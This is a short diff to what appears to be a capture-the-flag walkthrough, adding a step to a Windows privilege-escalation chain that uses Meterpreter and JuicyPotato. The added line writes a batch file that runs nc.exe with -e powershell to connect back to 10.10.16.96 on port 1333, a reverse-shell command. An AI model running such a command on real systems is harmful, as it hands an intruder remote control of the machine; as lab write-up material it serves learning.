@@ -102,6 +102,10 @@ From the meterpreter, upload the JuicyPotato.exe and a bat file containing the c
 
 *I've renamed my files to not mix them with other users doing the same thing. jpjp.exe is the JuicyPotato.exe*
 
+Create shell-script:
+
+`echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell 10.10.16.96 1333 > myownshell.bat`
+
 
 ![jpjpexe](assets/markdown-img-paste-2021081713384024.png)
 
